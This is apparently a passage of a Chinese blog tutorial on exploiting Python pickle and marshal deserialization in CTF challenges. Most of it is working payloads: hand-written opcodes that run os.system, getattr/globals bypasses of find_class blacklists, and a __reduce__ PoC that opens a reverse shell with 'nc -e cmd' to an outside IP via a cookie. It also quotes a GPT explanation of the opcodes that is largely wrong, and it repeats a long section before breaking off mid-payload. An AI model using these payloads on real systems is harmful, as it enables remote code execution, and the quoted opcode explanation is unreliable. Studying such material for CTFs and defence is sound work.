在这里可以体会到为何pickle是一种语言，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。 根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。 5.4.1 常用opcode解析 为了充分理解栈的作用，强烈建议一边看动图一边学习opcode的作用： 由于pickle库中的注释不是很详细，网上的其他资料也没有具体地把栈和memo上的变化讲清楚，以下的每个opcode的操作都是hachp1师傅经过实验验证并且尽可能将栈和memo上的变化解释清楚，常用的opcode如下： opcode 描述 具体写法 栈上的变化 memo上的变化 c 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包） c[module] [instance] 获得的对象入栈 无 o 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） o 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 无 i 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象） i[module] [callable] 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈 无 N 实例化一个None N 获得的对象入栈 无 S 实例化一个字符串对象 S’xxx’ （也可以使用双引号、'等python字符串形式） 获得的对象入栈 无 V 实例化一个UNICODE字符串对象 Vxxx 获得的对象入栈 无 I 实例化一个int对象 Ixxx 获得的对象入栈 无 F 实例化一个float对象 Fx.x 获得的对象入栈 无 R 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数 R 函数和参数出栈，函数的返回值入栈 无 . 程序结束，栈顶的一个元素作为pickle.loads()的返回值 . 无 无 ( 向栈中压入一个MARK标记 ( MARK标记入栈 无 t 寻找栈中的上一个MARK，并组合之间的数据为元组 t MARK标记以及被组合的数据出栈，获得的对象入栈 无 ) 向栈中直接压入一个空元组 ) 空元组入栈 无 l 寻找栈中的上一个MARK，并组合之间的数据为列表 l MARK标记以及被组合的数据出栈，获得的对象入栈 无 ] 向栈中直接压入一个空列表 ] 空列表入栈 无 d 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对） d MARK标记以及被组合的数据出栈，获得的对象入栈 无 } 向栈中直接压入一个空字典 } 空字典入栈 无 p 将栈顶对象储存至memo_n pn 无 对象被储存 g 将memo_n的对象压栈 gn 对象被压栈 无 0 丢弃栈顶对象 0 栈顶对象被丢弃 无 b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 b 栈上第一个元素出栈 无 s 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中 s 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新 无 u 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 u MARK标记以及被组合的数据出栈，字典被更新 无 a 将栈的第一个元素append到第二个元素(列表)中 a 栈顶元素出栈，第二个元素（列表）被更新 无 e 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中 e MARK标记以及被组合的数据出栈，列表被更新 无 此外， TRUE 可以用 I 表示： b'I01 ' ； FALSE 也可以用 I 表示： b'I00 ' ，其他opcode可以在pickle库的源代码中找到。 由这些opcode我们可以得到一些需要注意的地方： 编写opcode时要想象栈中的数据，以正确使用每种opcode。 在理解时注意与python本身的操作对照（比如python列表的append对应a、extend对应e；字典的update对应u）。 c操作符会尝试import库，所以在pickle.loads时不需要漏洞代码中先引入系统库。 pickle不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数（如getattr、dict.get）才能进行。但是因为存在s、u、b操作符，作为右值是可以的。即“查值不行，赋值可以”。pickle能够索引查值的操作只有c、i。而如何查值也是CTF的一个重要考点。 s、u、b操作符可以构造并赋值原来没有的属性、键值对。 5.4.2 拼接opcode 将第一个pickle流结尾表示结束的 . 去掉，将第二个pickle流与第一个拼接起来即可。 全局变量覆盖 python源码： # secret.py name='TEST3213qkfsmfo' # main.py import pickle import secret opcode='''c__main__ secret (S'name' S'1' db.''' print('before:',secret.name) output=pickle.loads(opcode.encode()) print('output:',output) print('after:',secret.name) 首先，通过 c 获取全局变量 secret ，然后建立一个字典，并使用 b 对secret进行属性设置，使用到的payload： opcode='''c__main__ secret (S'name' S'1' db.''' 输出如下： before: TEST3213qkfsmfo output: &lt;module 'secret' from 'D:\\\\Pythonproject\\\\Pickle_Study\\\\secret.py'&gt; after: 1 函数执行 与函数执行相关的opcode有三个： R 、 i 、 o ，所以我们可以从三个方向进行构造： R ： b'''cos system (S'whoami' tR.''' i ： b'''(S'whoami' ios system .''' o ： b'''(cos system S'whoami' o.''' 实例化对象 实例化对象是一种特殊的函数执行，这里简单的使用 R 构造一下，其他方式类似： import pickle class Student: def __init__(self, name, age): self.name = name self.age = age poc = b'''c__main__ Student (S'hybcx' S'19' tR.''' a = pickle.loads(poc) print(a.name, a.age) 到这里已经基本熟练对于该手工构造payload了，也能对每条语句看懂，不过有点疑惑的就是最前面的b，对于上述表格的解释，我还是有点懵懂，只是感觉b只是一个使后续的字符串成为一个对象的作用吧，可能。 pker的使用（推荐） pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：通过AST来构造Pickle opcode。 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。 注意事项 pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如： # linux(注意posix): b'cposix system p0 (Vwhoami p1 tp2 Rp3 .' # windows(注意nt): b'cnt system p0 (Vwhoami p1 tp2 Rp3 .' 5.4.3 CTF实战 做题之前：了解pickle.Unpickler.find_class() 由于官方针对pickle的安全问题的建议是修改find_class()，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如 何绕过该函数很重要。 什么时候会调用find_class()： 从opcode角度看，当出现c、i、b'\\x93'时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。 从python代码来看，find_class()只会在解析opcode时调用一次，所以只要绕过opcode执行过程，find_class()就不会再调用，也就是说find_class()只需要调用过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过__import__绕过一些黑名单。 下面先看两个例子： safe_builtins = {'range','complex','set','frozenset','slice',} class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %(module, name)) class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # 只允许__main__模块 return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) 第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为{'range','complex','set','frozenset','slice',}。 第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许__main__模块。虽然看起来很安全，但是被引入主程序的模块都可以通过__main__调用修改，所以造成了变量覆盖。 由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过find_class函数内 的限制就是pickle反序列化解题的关键。 此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做 题的时候可以先把白名单模块的文档看一看:) 绕过builtins 在一些例子中，我们常常会见到module==\"builtins\"这一限制，比如官方文档中的例子，只允许我们导入builtins这一模块 if module == \"builtins\" and name in safe_builtins: return getattr(builtins, name) 那么什么是builtins模块呢？ 当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，如 &gt;&gt;&gt;int(1) 1 上述这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。 我们可以通过for i in sys.modules['builtins'].__dict__:print(i)来查看该模块中包含的所有模块函数等，大致如下 Code-Breaking:picklecode import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'} def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler(io.BytesIO(s)).load() 题目将pickle能够引入的模块限定为builtins，并且设置了子模块黑名单：{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}，于是我们能够直接利用的模块有： builtins模块中，黑名单外的子模块。 已经import的模块：io、builtins（需要先利用builtins模块中的函数） 黑名单中没有getattr，所以可以通过getattr获取io或builtins的子模块以及子模块的子模块:)，而builtins里有eval、exec等危险函数，即使在黑名单中，也可以通过getattr获得。pickle不能直接获取builtins一级模块，但可以通过builtins.globals()获得builtins；这样就可以执行任意代码了。 我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用getattr()函数，getattr可以获取对象的属性值。因此我们可以通过builtins.getattr(builtins,'eval')的形式来获取eval函数 接下来我们得构造出一个builtins模块来传给getattr的第一个参数，我们可以使用builtins.globals()函数获取builtins模块包含的内容 import builtins print(builtins.globals()) 可见builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数 最终构造的payload为builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) 思路有了，下面就是手写opcode了。首先获取get函数 import pickle import pickletools opcode=b'''cbuiltins getattr (cbuiltins dict S'get' tR. ''' pickletools.dis(opcode) print(pickle.loads(opcode)) ###结果如下 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: . STOP highest protocol among opcodes = 0 &lt;method 'get' of 'dict' objects&gt; 然后获取globals()字典 import pickle import pickletools opcode2=b'''cbuiltins globals )R. ''' pickletools.dis(opcode2) print(pickle.loads(opcode2)) ###结果如下 0: c GLOBAL 'builtins globals' 18: ) EMPTY_TUPLE 19: R REDUCE 20: . STOP highest protocol among opcodes = 1 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001EF06A308B0&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': 'C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py', '__cached__': None, 'pickle': &lt;module 'pickle' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickle.py'&gt;, 'pickletools': &lt;module 'pickletools' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickletools.py'&gt;, 'opcode1': b\"cbuiltins getattr (cbuiltins dict S'get' tR. \", 'opcode2': b'cbuiltins globals )R. '} 现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了 import pickle import pickletools opcode3=b'''cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tR.''' #以上opcode相当于执行了builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins') pickletools.dis(opcode3) print(pickle.loads(opcode3)) ###结果如下 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: ( MARK 44: c GLOBAL 'builtins globals' 62: ( MARK 63: t TUPLE (MARK at 62) 64: R REDUCE 65: S STRING 'builtins' 77: t TUPLE (MARK at 43) 78: R REDUCE 79: . STOP highest protocol among opcodes = 0 &lt;module 'builtins' (built-in)&gt; 最后我们再调用获取到的builtins的eval函数即可 import pickle opcode4=b'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR.''' print(pickle.loads(opcode4)) ### &lt;built-in function eval&gt; 最终payload为： b'''cbuiltins getattr p0 (cbuiltins dict S'get' tRp1 cbuiltins globals )Rp2 00g1 (g2 S'builtins' tRp3 0g0 (g3 S'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' 这里附上GPT的分析，但解释的不太好。。。 让我们逐行解释上述 Pickle 数据块中的代码，并说明每行之间的共同作用： 1. `cbuiltins`: 这个操作码表示使用 `builtins` 模块。 2. `getattr`: 这个操作码表示调用 `builtins` 模块的 `getattr` 函数。 3. `p0`: 这个操作码表示将接下来的值压入堆栈顶，标记为位置 `0`。 4. `(cbuiltins`: 这个操作码表示创建一个元组，包含了 `builtins` 模块。 共同作用：`cbuiltins` 和 `getattr` 一起表示使用 `builtins` 模块的 `getattr` 函数。 结果：此时堆栈顶部包含了一个表示 `getattr` 函数的对象。 5. `dict`: 这个操作码表示创建一个空字典。 6. `S'get'`: 这个操作码表示将字符串 `'get'` 压入堆栈。 7. `tRp1`: 这个操作码表示调用 `dict` 构造函数，将键值对加入字典。这里的键是字符串 `'get'`。 共同作用：`dict`、`S'get'` 和 `tRp1` 一起表示创建一个字典，其中包含了一个键值对（键为 `'get'`）。 结果：此时堆栈顶部包含了一个字典。 8. `cbuiltins`: 这个操作码表示使用 `builtins` 模块。 9. `globals`: 这个操作码表示调用 `builtins` 模块的 `globals` 函数。 10. `)Rp2`: 这个操作码表示调用 `dict` 构造函数，将键值对加入字典。这里的键是字符串 `'globals'`。 共同作用：`cbuiltins`、`globals` 和 `)Rp2` 一起表示创建一个字典，其中包含了两个键值对。 结果：此时堆栈顶部包含了一个字典。 11. `00g1`: 这个操作码表示将两个字典压入堆栈。 12. `(g2`: 这个操作码表示创建一个元组，包含了两个字典。 13. `S'builtins'`: 这个操作码表示将字符串 `'builtins'` 压入堆栈。 14. `tRp3`: 这个操作码表示调用 `__import__` 函数，并将堆栈顶部的两个值作为参数传递给 `__import__`。 共同作用：`(g2`、`S'builtins'` 和 `tRp3` 一起表示使用 `__import__` 函数导入 `builtins` 模块。 结果：此时堆栈顶部包含了 `builtins` 模块的对象。 15. `0g0`: 这个操作码表示将两个字典压入堆栈。 16. `(g3`: 这个操作码表示创建一个元组，包含了两个字典。 17. `S'eval'`: 这个操作码表示将字符串 `'eval'` 压入堆栈。 18. `tR`: 这个操作码表示调用 `eval` 函数，并将堆栈顶部的两个值作为参数传递给 `eval`。 19. `(S'__import__(\"os\").system(\"whoami\")'`: 这个操作码表示创建一个元组，包含了一个字符串，其中包含了 `eval` 执行的代码。这段代码尝试执行系统命令 `whoami`。 20. `tR.`: 这个操作码表示调用 `eval` 函数，并将堆栈顶部的两个值作为参数传递给 `eval`。 最终结果：根据 `eval` 函数的调用，它会执行字符串 `'__import__(\"os\").system(\"whoami\")'` 中的代码，即执行系统命令 `whoami`。由于这段代码是恶意的，它试图在系统上执行一个命令，这可能会引发安全问题。因此，处理来自不受信任源的 Pickle 数据时要非常小心，以防止潜在的安全风险。 这里用pker工具使用的话，过程如下： #payload.py #获取getattr函数 getattr = GLOBAL('builtins', 'getattr') #获取字典的get方法 get = getattr(GLOBAL('builtins', 'dict'), 'get') #获取globals方法 golbals=GLOBAL('builtins', 'globals') #获取字典 builtins_dict=golbals() #获取builtins模块 __builtins__ = get(builtins_dict, '__builtins__') #获取eval函数 eval=getattr(__builtins__,'eval') eval(\"__import__('os').system('whoami')\") return python3 pker.py &lt; pker_test.py b\"cbuiltins getattr p0 0g0 (cbuiltins dict S'get' tRp1 0cbuiltins globals p2 0g2 (tRp3 0g1 (g3 S'__builtins__' tRp4 0g0 (g4 S'eval' tRp5 0g5 (S'__import__(\\\\'os\\\\').system(\\\\'whoami\\\\')' tR.\" 高校战疫网络安全分享赛:webtmp 限制中，改写了find_class函数，只能生成__main__模块的pickle： class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # 只允许__main__模块 return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) 此外，禁止了b'R'： try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' 目标是覆盖secret中的验证，由于secret被主程序引入，是存在于__main__下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制： b'''c__main__ secret (S'name' S\"1\" S\"category\" S\"2\" db0(S\"1\" S\"2\" i__main__ Animal .''' 除了以上这些题外，还有BalsnCTF:pyshv1-v3和SUCTF-2019:guess_game四道题，由于手动写还是比较麻烦，在后文中使用pker工具完成。 CTF-case1 上述的反序列化题目还是有难度的，这里看小迪有一个简单的CTF案例，浅浅研究一下 import pickle import base64 from flask import Flask, request app = Flask(__name__) @app.route(\"/\")# /路由下的功能 def index(): try: #对cookie中的user参数进行base64的解码 user = base64.b64decode(request.cookies.get('user')) #对user参数反序列化 user = pickle.loads(user) #将其中的username对应的值赋值 username = user[\"username\"] except: #如果user数据中没有username键值，则将username赋值为指定字符串 username = \"Guest\" return \"Hello %s\" % username if __name__ == \"__main__\": app.run( host='192.168.1.3', port=5000, debug=True ) 这里是开启环境的py文件。分析一波很明显就是我们要将user参数传入cookie并且还要进行base编码，那其中user可控，直接传入恶意序列化数据即可，我们运行之后bp抓包。接着我们编写一下poc import pickle import os import base64 import requests class exp(): def __reduce__(self): return (os.system,('nc -e cmd 124.220.233.26 5555',)) p = exp() result = pickle.dumps(p) result = base64.b64encode(result) print(result) #输出b'gASVNQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjB1uYyAtZSBjbWQgMTI0LjIyMC4yMzMuMjYgNTU1NZSFlFKULg==' 这里我们对reduce方法进行了重写，最后的数据如果被反序列化，那将会执行nc命令去尝试连接对应ip的port 如上图我们成功拿到shell，那这里我们仍然可以继续编写，使其功能完善，直接在py上对靶机进行请求，不必使用bp，我们做如下修改 import pickle import os import base64 import requests class exp(): def __reduce__(self): return (os.system,('nc -e cmd 124.220.233.26 5555',)) p = exp() result = pickle.dumps(p) print(result) result = base64.b64encode(result).decode() print(result) header = { 'Cookie': 'user='+result } requests.get(url='http://192.168.246.1:5000/', headers=header) 让其运行的时候自动访问靶机地址，如下图执行成功。 不过这里有一个嫌疑，就是该命令可以我再执行上述exp程序的时候（反序列化的时候会自动调用reduce方法）便被调用，因此我们可以本机开环境，另一台主机执行上述poc 如上图可以看到成功执行，不过这里似乎需要注意python版本问题，上述CTF环境是在Python3.8下搭建的，这里运行poc脚本似乎也需要在Python3.8下运行（因为我再python3.11下测试不成功） 0x06 Marshal 反序列化 由于pickle无法序列化code对象, 因此在python2.6后增加了一个marshal模块来处理code对象的序列化问题. import base64 import marshal def demo(): import os os.system('/bin/sh') code_serialized = base64.b64encode(marshal.dumps(demo())) print(code_serialized) 但是marshal不能直接使用__reduce__, 因为reduce是利用调用某个callable并传递参数来执行的, 而marshal函数本身就是一个callable, 需要执行它, 而不是将他作为某个函数的参数. 这时候就要利用上面分析的那个PVM操作码来进行构造了, 先写出来需要执行的内容, Python能通过types.FunctionTyle(func_code,globals(),'')()来动态地创建匿名函数, 这一部分的内容可以看官方文档的介绍. 结合上文的示例代码, 最重要执行的是: (types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))(). 这里直接贴一下别的师傅给出来的Payload模板. import base64 import pickle import marshal def foo(): import os os.system('whoami;/bin/sh') # evil code shell = \"\"\"ctypes FunctionType (cmarshal loads (cbase64 b64decode (S'%s' tRtRc__builtin__ globals (tRS'' tR(tR.\"\"\" % base64.b64encode(marshal.dumps(foo.func_code)) print(pickle.loads(shell)) 0x07 Pass总结 7.1 绕过builtins 思路一 这里上述的CTF分析过该思路了，这里我就直接cv了 在一些例子中，我们常常会见到module==\"builtins\"这一限制，比如官方文档中的例子，只允许我们导入builtins这一模块 if module == \"builtins\" and name in safe_builtins: return getattr(builtins, name) 那么什么是builtins模块呢？ 当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，如 &gt;&gt;&gt;int(1) 1 上述这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。 我们可以通过for i in sys.modules['builtins'].__dict__:print(i)来查看该模块中包含的所有模块函数等，大致如下 Code-Breaking:picklecode import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'} def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler(io.BytesIO(s)).load() 题目将pickle能够引入的模块限定为builtins，并且设置了子模块黑名单：{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}，于是我们能够直接利用的模块有： builtins模块中，黑名单外的子模块。 已经import的模块：io、builtins（需要先利用builtins模块中的函数） 黑名单中没有getattr，所以可以通过getattr获取io或builtins的子模块以及子模块的子模块:)，而builtins里有eval、exec等危险函数，即使在黑名单中，也可以通过getattr获得。pickle不能直接获取builtins一级模块，但可以通过builtins.globals()获得builtins；这样就可以执行任意代码了。 我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用getattr()函数，getattr可以获取对象的属性值。因此我们可以通过builtins.getattr(builtins,'eval')的形式来获取eval函数 接下来我们得构造出一个builtins模块来传给getattr的第一个参数，我们可以使用builtins.globals()函数获取builtins模块包含的内容 import builtins print(builtins.globals()) 可见builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数 最终构造的payload为builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command) 思路有了，下面就是手写opcode了。首先获取get函数 import pickle import pickletools opcode=b'''cbuiltins getattr (cbuiltins dict S'get' tR. ''' pickletools.dis(opcode) print(pickle.loads(opcode)) ###结果如下 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: . STOP highest protocol among opcodes = 0 &lt;method 'get' of 'dict' objects&gt; 然后获取globals()字典 import pickle import pickletools opcode2=b'''cbuiltins globals )R. ''' pickletools.dis(opcode2) print(pickle.loads(opcode2)) ###结果如下 0: c GLOBAL 'builtins globals' 18: ) EMPTY_TUPLE 19: R REDUCE 20: . STOP highest protocol among opcodes = 1 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001EF06A308B0&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': 'C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py', '__cached__': None, 'pickle': &lt;module 'pickle' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickle.py'&gt;, 'pickletools': &lt;module 'pickletools' from 'C:\\\\Users\\\\34946\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python38\\\\lib\\\\pickletools.py'&gt;, 'opcode1': b\"cbuiltins getattr (cbuiltins dict S'get' tR. \", 'opcode2': b'cbuiltins globals )R. '} 现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了 import pickle import pickletools opcode3=b'''cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tR.''' #以上opcode相当于执行了builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins') pickletools.dis(opcode3) print(pickle.loads(opcode3)) ###结果如下 0: c GLOBAL 'builtins getattr' 18: ( MARK 19: c GLOBAL 'builtins dict' 34: S STRING 'get' 41: t TUPLE (MARK at 18) 42: R REDUCE 43: ( MARK 44: c GLOBAL 'builtins globals' 62: ( MARK 63: t TUPLE (MARK at 62) 64: R REDUCE 65: S STRING 'builtins' 77: t TUPLE (MARK at 43) 78: R REDUCE 79: . STOP highest protocol among opcodes = 0 &lt;module 'builtins' (built-in)&gt; 最后我们再调用获取到的builtins的eval函数即可 import pickle opcode4=b'''cbuiltins getattr (cbuiltins getattr (cbuiltins dict S'get' tR(cbuiltins globals )RS'__builtins__' tRS'eval' tR.''' print(pickle.loads(opcode4)) ### &lt;built-in function eval&gt; 最终payload为： b'''cbuiltins getattr p0 (cbuiltins dict S'get' tRp1 cbuiltins globals )Rp2 00g1 (g2 S'builtins' tRp3 0g0 (g3 S'eval' tR(S'__import__(\"os\").system(\"whoami\")' tR. ''' 这里附上GPT的分析，但解释的不太好。。。 思路二 这里也是跟着佬学的，他是通过globals全局变量中的pickle直接进行的，说明如下： 输出之后我们看到里面确实含有pickle模块，那我们可以尝试导入使用pickle.loads()来绕过find_class()的限制 但这里存在一些小问题，这里直接放出佬的思考研究了： 不过值得注意的是，由于pickle.loads()的参数需要为byte类型。而在Protocol 0中，对于byte类型并没有很好的支持，需要额外导入encode()函数，可能会导致无法绕过find_class限制。 import pickle import pickletools b=b'abcdef' opcode=pickle.dumps(b,protocol=0) pickletools.dis(opcode) ### 0: c GLOBAL '_codecs encode' 16: p PUT 0 19: ( MARK 20: V UNICODE 'abcdef' 28: p PUT 1 31: V UNICODE 'latin1' 39: p PUT 2 42: t TUPLE (MARK at 19) 43: p PUT 3 46: R REDUCE 47: p PUT 4 50: . STOP highest protocol among opcodes = 0 直到Protocol 3版本，Python才引入了B和C两个字节码来标识byte类型 # Protocol 3 (Python 3.x) BINBYTES = b'B' # push bytes; counted binary string argument SHORT_BINBYTES = b'C' # \" \" ; \" \" \" \" &lt; 256 bytes import pickle import pickletools b=b'abcdef' opcode=pickle.dumps(b,protocol=0) pickletools.dis(opcode) ### 0: \\x80 PROTO 3 2: C SHORT_BINBYTES b'abcdef' 10: q BINPUT 0 12: . STOP highest protocol among opcodes = 3 可以看到此时pickle对于byte类型变量的支持精简了很多。所以当我们想利用pickle.loads()来绕过find_class时，最好选择Protocol 3版本的opcode构造。 下面我们就来一步步构造Protocol 3版本的Payload 首先获取get函数 import pickle import builtins import pickletools class Demo: def __reduce__(self): return (getattr,(builtins.dict, 'get',)) poc = Demo() opcode = pickle.dumps(poc, protocol=3) print(opcode) pickletools.dis(opcode) #输出： b'\\x80\\x03cbuiltins getattr q\\x00cbuiltins dict q\\x01X\\x03\\x00\\x00\\x00getq\\x02\\x86q\\x03Rq\\x04.' 0: \\x80 PROTO 3 2: c GLOBAL 'builtins getattr' 20: q BINPUT 0 22: c GLOBAL 'builtins dict' 37: q BINPUT 1 39: X BINUNICODE 'get' 47: q BINPUT 2 49: \\x86 TUPLE2 50: q BINPUT 3 52: R REDUCE 53: q BINPUT 4 55: . STOP highest protocol among opcodes = 2 其中有很多q\\0xn字节码，实际测试去掉也是可以的 BINPUT = b'q' # \" \" \" \" \" ; \" \" 1-byte arg 构造思路和Protocol 0类似，我们构造出pickle.loads()函数 import pickle opcode=b\"\\x80\\x03cbuiltins getattr (cbuiltins getattr cbuiltins dict X\\x03\\x00\\x00\\x00get\\x86R(cbuiltins globals )RS'pickle' tRS'loads' tR.\" print(pickle.loads(opcode)) ### &lt;built-in function loads&gt; 这上述的构造pickle.loads真心看不懂。。。。接着我们生成要执行的Payload import pickle import os class Command: def __reduce__(self): command=\"whoami\" return (os.system,(command,)) op=Command() opcode=pickle.dumps(op,protocol=0) print(opcode) ### b'cnt system p0 (Vwhoami p1 tp2 Rp3 .' 由于loads()函数接受的是byte类型参数，为了方便构造，我们先手动看一下pickle.loads(payload)的字节码，方便我们后续构造 import pickle import pickletools class bin: def __reduce__(self): return (pickle.loads,(b'''cos system (S'whoami' tR.''',)) b=bin() # b=b'abcdef' opcode=pickle.dumps(b,protocol=3) print(opcode) pickletools.dis(opcode) ### b\"\\x80\\x03c_pickle loads q\\x00C\\x19cos system (S'whoami' tR.q\\x01\\x85q\\x02Rq\\x03.\" 0: \\x80 PROTO 3 2: c GLOBAL '_pickle loads' 17: q BINPUT 0 19: C SHORT_BINBYTES b\"cos system (S'whoami' tR.\" 46: q BINPUT 1 48: \\x85 TUPLE1 49: q BINPUT 2 51: R REDUCE 52: q BINPUT 3 54: . STOP highest protocol among opcodes = 3 这里使用了字节码C代表byte类型，然后后面跟上数据长度的十六进制即可，我们将加粗部分C\\x19cos system (S'whoami' tR.和上文构造好的pickle.loads()函数合并即可，完整payload如下。 opcode=b\"\\x80\\x03cbuiltins getattr (cbuiltins getattr cbuiltins dict X\\x03\\x00\\x00\\x00get\\x86R(cbuiltins globals )RS'pickle' tRS'loads' tRC\\x19cos system (S'whoami' tR.\\x85R.\" 测试绕过 import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'} def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler(io.BytesIO(s)).load() opcode2=opcode=b\"\\x80\\x03cbuiltins getattr (cbuiltins getattr 